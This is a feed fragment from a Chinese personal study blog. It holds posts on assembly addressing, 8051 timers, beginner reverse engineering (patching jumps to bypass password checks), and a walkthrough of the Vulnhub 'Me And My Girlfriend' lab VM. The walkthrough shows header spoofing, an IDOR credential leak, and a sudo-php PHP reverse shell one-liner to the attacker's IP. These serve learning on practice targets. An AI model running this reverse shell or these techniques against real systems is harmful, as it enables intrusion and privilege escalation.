    <content type="html"><![CDATA[<h1 id="汇编基础13–间接寻址"><a href="#汇编基础13–间接寻址" class="headerlink" title="汇编基础13–间接寻址"></a>汇编基础13–间接寻址</h1><p>可以把寄存器当做指针来进行寻址操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum word 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">xor eax ,eax</span><br><span class="line">xor ebx ,ebx</span><br><span class="line">mov eax ,offset arrnum</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>也可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum word 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">xor eax ,eax</span><br><span class="line">xor ebx ,ebx</span><br><span class="line">mov eax ,offset arrnum</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">mov bl ,[eax+2]</span><br><span class="line">mov bl ,[eax+4]</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><h3 id="比例因子"><a href="#比例因子" class="headerlink" title="比例因子"></a>比例因子</h3><p>利用数组下标进行寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum dword 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov esi ,4</span><br><span class="line">mov eax ,arrnum[esi * 4]</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;汇编基础13–间接寻址&quot;&gt;&lt;a href=&quot;#汇编基础13–间接寻址&quot; class=&quot;headerlink&quot; title=&quot;汇编基础13–间接寻址&quot;&gt;&lt;/a&gt;汇编基础13–间接寻址&lt;/h1&gt;&lt;p&gt;可以把寄存器当做指针来进行寻址操作&lt;/p&gt;
&lt;figure clas
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="汇编基础学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>51单片机入门04--定时&amp;计数器</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&amp;%E8%AE%A1%E6%95%B0%E5%99%A8/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&amp;%E8%AE%A1%E6%95%B0%E5%99%A8/</id>
    <published>2020-05-20T12:57:19.000Z</published>
    <updated>2020-05-28T23:29:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="51单片机入门04–定时-amp-计数器"><a href="#51单片机入门04–定时-amp-计数器" class="headerlink" title="51单片机入门04–定时&amp;计数器"></a>51单片机入门04–定时&amp;计数器</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="image-20200520204754535.png" alt="image-20200520204754535"></p><p>常用的工作方式是1（16位）和2（8位自动重置，用于串口通信产生波特率）</p><p>一般用的是工作方式1</p><p><img src="image-20200520205107854.png" alt="image-20200520205107854"></p><p>GATE一般给0，如果通过外部中断来启用定时计数器，可以给1</p><p><img src="image-20200520205329831.png" alt="image-20200520205329831"></p><h4 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h4><p><img src="image-20200520205738730.png" alt="image-20200520205738730"></p><p>单片机定时器单位是us，1ms=1000us</p><blockquote><p>11.0592MHz用于通讯</p></blockquote><p><img src="image-20200528214728882.png" alt="image-20200528214728882"></p><p>例：使用定时器显示数字，每秒一变</p><p><img src="image-20200529072341040.png" alt="image-20200529072341040"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> num[] = &#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inittimer</span><span class="params">()</span></span>&#123;</span><br><span class="line">TMOD = <span class="number">0x01</span>; <span class="comment">//0000 0001</span></span><br><span class="line">TH0 = (<span class="number">65536</span><span class="number">-50000</span>)/<span class="number">256</span>;<span class="comment">//16位定时初值高8位</span></span><br><span class="line">TL0 = (<span class="number">65536</span><span class="number">-50000</span>)%<span class="number">256</span>;</span><br><span class="line">ET0 = <span class="number">1</span>;<span class="comment">//开启定时器0中断</span></span><br><span class="line">EA = <span class="number">1</span>; <span class="comment">//开启总中断</span></span><br><span class="line">TR0 = <span class="number">1</span>; <span class="comment">//开启定时器0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">P2 = num[n];</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">10</span>)&#123;</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">inittimer();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">display</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_isr</span><span class="params">()</span> interrupt 1</span>&#123;</span><br><span class="line">TH0 = (<span class="number">65536</span><span class="number">-50000</span>)/<span class="number">256</span>; <span class="comment">//50us</span></span><br><span class="line">TL0 = (<span class="number">65536</span><span class="number">-50000</span>)%<span class="number">256</span>;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span>(count==<span class="number">20</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">count=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：计数器</p><p><img src="image-20200529072849386.png" alt="image-20200529072849386"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg51.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> num[] = &#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initcounter</span><span class="params">()</span></span>&#123;</span><br><span class="line">TMOD = <span class="number">0x06</span>;</span><br><span class="line">TH0 = <span class="number">256</span> - <span class="number">1</span>;</span><br><span class="line">TL0 = TH0;</span><br><span class="line">ET0 =<span class="number">1</span>;</span><br><span class="line">EA =<span class="number">1</span>;</span><br><span class="line">TR0 =<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">P2 = num[n];</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">10</span>)n=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">initcounter();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">display</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">counter_isr</span><span class="params">()</span> interrupt 1</span>&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;51单片机入门04–定时-amp-计数器&quot;&gt;&lt;a href=&quot;#51单片机入门04–定时-amp-计数器&quot; class=&quot;headerlink&quot; title=&quot;51单片机入门04–定时&amp;amp;计数器&quot;&gt;&lt;/a&gt;51单片机入门04–定时&amp;amp;计数器&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="51单片机学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>【Vulnhub】Me And My Girlfriend--Workthourgh</title>
    <link href="http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/"/>
    <id>http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/</id>
    <published>2020-05-20T08:06:19.000Z</published>
    <updated>2020-05-20T12:09:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh"><a href="#【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh" class="headerlink" title="【Vulnhub】Me And My Girlfriend:1–Workthourgh"></a>【Vulnhub】Me And My Girlfriend:1–Workthourgh</h2><blockquote><p>文章作者：kn0sky</p><p>作者博客：kn0sky.com</p></blockquote><p>本来想下载新的靶机去玩的，无奈下载速度太慢，无意间发现去年下载的没打过的靶机，是个简单难度的，刚好挺久没练习了，有点生疏了拿来练练手，耗时：2小时</p><h3 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Date release: 13 Dec 2019</span><br><span class="line">Author: TW1C3</span><br><span class="line">Series: Me and My Girlfriend</span><br><span class="line"></span><br><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br></pre></td></tr></table></figure><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/" target="_blank" rel="external nofollow noopener noreferrer">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><h3 id="用到的知识-amp-工具"><a href="#用到的知识-amp-工具" class="headerlink" title="用到的知识&amp;工具"></a>用到的知识&amp;工具</h3><ul><li>nmap&amp;主机发现、端口扫描</li><li>burp&amp;修改请求包信息</li><li>sudo -l查看权限</li><li>php反弹shell</li></ul><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>攻击机的IP地址为192.168.101.5</p><p>靶机的IP地址为192.168.101.4</p><p>先端口扫描</p><p><img src="image-20200520163545755.png" alt="image-20200520163545755"></p><p>目标开放了22端口和80端口</p><p>查看80端口</p><p><img src="image-20200520164618303.png" alt="image-20200520164618303"></p><p>看起来像个提示，等会再说，先进行目录爆破看看，得到几个可以访问的地址</p><p><img src="image-20200520164704590.png" alt="image-20200520164704590"></p><p>在robots.txt文件里找到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><p>访问这个地址：</p><p><img src="image-20200520164822736.png" alt="image-20200520164822736"></p><p>看起来又是个提示</p><p>这个网站主页上说，网站只能从内部访问，这里猜测服务器通过IP地址来判断访问者来源，那么我们在访问请求中添加XFF头来试一试：<code>X-Forwarded-For:127.0.0.1</code></p><p><img src="image-20200520175517452.png" alt="image-20200520175517452"></p><p>网站成功跳转了（这里注意，每次发送请求都需要把XFF头加上）,成功进入网站主页：</p><p><img src="image-20200520175705133.png" alt="image-20200520175705133"></p><p>浏览一番发现，网站存在用户名密码泄露的问题，这里我们通过注册功能注册一个账号，然后登录进入，进入profile页面如下：</p><p><img src="image-20200520175929238.png" alt="image-20200520175929238"></p><p>在这个页面刷新，用Burp抓包，把抓到的包放到repeater模块中</p><p><img src="image-20200520180051559.png" alt="image-20200520180051559"></p><p>可以轻易发现，我们的账号密码在网页中是以明文保存的，这个时候我们修改请求中的user_id参数，可以发现，不同的user_id的值代表不同的用户信息（账号&amp;密码）</p><p>通过不断修改user_id的值我们可以得到如下用户名和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eweuhtandingan:skuyatuh</span><br><span class="line">aingmaung:qwerty!!!</span><br><span class="line">sundatea:indONEsia</span><br><span class="line">sedihaingmah:cedihhihihi</span><br><span class="line">alice:4lic3</span><br></pre></td></tr></table></figure><p>拿到了目标Alice的账号密码，ssh登录服务器看看：</p><p><img src="image-20200520180431376.png" alt="image-20200520180431376"></p><p>登陆成功，且在<code>alice</code>的主目录下找到了<code>flag1</code></p><p>以及emmmm，alice不喜欢bob了？？？算了，管他呢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ cat my_notes.txt </span><br><span class="line">Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes</span><br></pre></td></tr></table></figure><p>下一步是拿到root权限，先查看一下Alice账号的权限吧：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>alice可以免密码使用root权限执行php命令，这就好办了，思路是通过root权限执行php反弹shell到攻击机上</p><p>先在攻击机上运行nc来监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br></pre></td></tr></table></figure><p>然后使用alice 的账号运行php反弹shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo php -r <span class="string">'$sock=fsockopen("192.168.101.5",7788);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>这个时候我们拿到了反弹的shell:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br><span class="line">connect to [192.168.101.5] from (UNKNOWN) [192.168.101.4] 43264</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>既然已经提权到root了，直接去root目录找flag</p><p><img src="image-20200520182436014.png" alt="image-20200520182436014"></p><p>到此正式结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh&quot;&gt;&lt;a href=&quot;#【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh&quot; class=&quot;headerlink&quot; title=&quot;【Vulnh
      
    
    </summary>
    
    
      <category term="靶机笔记" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
    
      <category term="vulnhub" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向基础02--初试破解</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/</id>
    <published>2020-05-16T17:40:50.000Z</published>
    <updated>2020-05-17T10:13:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向基础02–初试破解"><a href="#逆向基础02–初试破解" class="headerlink" title="逆向基础02–初试破解"></a>逆向基础02–初试破解</h1><p>三个例子初试破解学习记录（样本均来自知识星球课件）</p><h3 id="例一：控制台破解例子"><a href="#例一：控制台破解例子" class="headerlink" title="例一：控制台破解例子"></a>例一：控制台破解例子</h3><p>目标是：登录成功！</p><h4 id="0x01-先找到程序入口"><a href="#0x01-先找到程序入口" class="headerlink" title="0x01 先找到程序入口"></a>0x01 先找到程序入口</h4><p>通过查找参考文本字符串可以轻松找到入口位置：</p><p><img src="image-20200517013016227.png" alt="image-20200517013016227"></p><h4 id="0x02-分析程序"><a href="#0x02-分析程序" class="headerlink" title="0x02 分析程序"></a>0x02 分析程序</h4><p>通过阅读反汇编代码，我们可知程序会首先让我们输入一次密码，然后把输入的密码一位一位和正确答案比对正确一位，如果全都相同也就是eax大于5，则登录成功</p><p>思路：</p><ol><li>直接跳转到登录成功的地方</li><li>修改eax大于5</li><li>修改待比对的数值，然后输入修改过的密码</li><li>通过待比对的数值计算出密码</li></ol><h4 id="0x03-破解程序"><a href="#0x03-破解程序" class="headerlink" title="0x03 破解程序"></a>0x03 破解程序</h4><p>直接按照思路1走最简单</p><p><img src="image-20200517013755039.png" alt="image-20200517013755039"></p><p>完成</p><p><img src="image-20200517013818165.png" alt="image-20200517013818165"></p><h3 id="例二：MFC破解例子"><a href="#例二：MFC破解例子" class="headerlink" title="例二：MFC破解例子"></a>例二：MFC破解例子</h3><p>重点在于学会查找字符串</p><p>这是图形界面的程序</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向基础02–初试破解&quot;&gt;&lt;a href=&quot;#逆向基础02–初试破解&quot; class=&quot;headerlink&quot; title=&quot;逆向基础02–初试破解&quot;&gt;&lt;/a&gt;逆向基础02–初试破解&lt;/h1&gt;&lt;p&gt;三个例子初试破解学习记录（样本均来自知识星球课件）&lt;/p&gt;
&lt;h3 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="逆向入门学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向基础01--初见逆向</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/</id>
    <published>2020-05-16T13:40:50.000Z</published>
    <updated>2020-05-16T15:07:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向基础01–初见逆向"><a href="#逆向基础01–初见逆向" class="headerlink" title="逆向基础01–初见逆向"></a>逆向基础01–初见逆向</h1><p>在使用VS2015生成解决方案的时候，有两个版本：</p><p><img src="image-20200516194459881.png" alt="image-20200516194459881"></p><p>分别是Debug和Release版</p><ul><li><p>Debug版比较大，带调试信息</p></li><li><p>Release版更小，会对代码进行优化精简</p></li></ul><h3 id="寻找主程序"><a href="#寻找主程序" class="headerlink" title="寻找主程序"></a>寻找主程序</h3><p>在逆向的时候，第一件事是先找到主程序</p><p>示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world!"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个字符串hello world!在运行的时候回打印出来，所以可以作为标志点去寻找</p><p>对于debug版本：（使用Ollydbg）</p><ul><li>ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进去</li></ul><p>对于Release版本：</p><ul><li>ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进入</li><li>F8跳转，见到红的F7进去，直到3个push1个call，很有可能是main函数（main函数特点：3个参数）F7进去看</li><li>也可以直接往上拖，一般release版本main函数在最上面附近</li><li>如果有API查找所有模块调用</li><li>也可以用ida，ida会自动分析出main函数</li></ul><h3 id="内存中数据的修改"><a href="#内存中数据的修改" class="headerlink" title="内存中数据的修改"></a>内存中数据的修改</h3><p>比如将前面的代码输出的hello world改为其他内容</p><p>直接修改1：</p><ol><li>找到需要修改的地方，F2加断点，F9执行过去</li><li>在内存窗口上右键，转到，输入地址</li><li>ollydbg在地址上，左键拖动选中，右键，二进制，编辑修改<ul><li>不保持大小可能会淹掉后面的数据</li></ul></li></ol><p>直接修改2：</p><ol><li>在内存空的地方，修改入其他的值</li><li>找到需要修改的地方的push，把push后面的地址改为刚才修改过的地址</li></ol><p>修改的作用：跳过程序中某些过程</p><h3 id="修改跳转"><a href="#修改跳转" class="headerlink" title="修改跳转"></a>修改跳转</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nNum);</span><br><span class="line"><span class="keyword">if</span> (nNum == <span class="number">87998623</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是输出success</p><p>先在ollydbg里找到main函数</p><p><img src="image-20200516212446200.png" alt="image-20200516212446200"></p><p>找到关键跳转，双击，汇编，改成我们要去的地址</p><p><img src="image-20200516215952286.png" alt="image-20200516215952286"></p><p>然后我随便输入个啥，都能输出success啦</p><p><img src="image-20200516224835553.png" alt="image-20200516224835553"></p><blockquote><p>把对比对象的值改掉也行，方法不唯一</p></blockquote><h3 id="滑板指令"><a href="#滑板指令" class="headerlink" 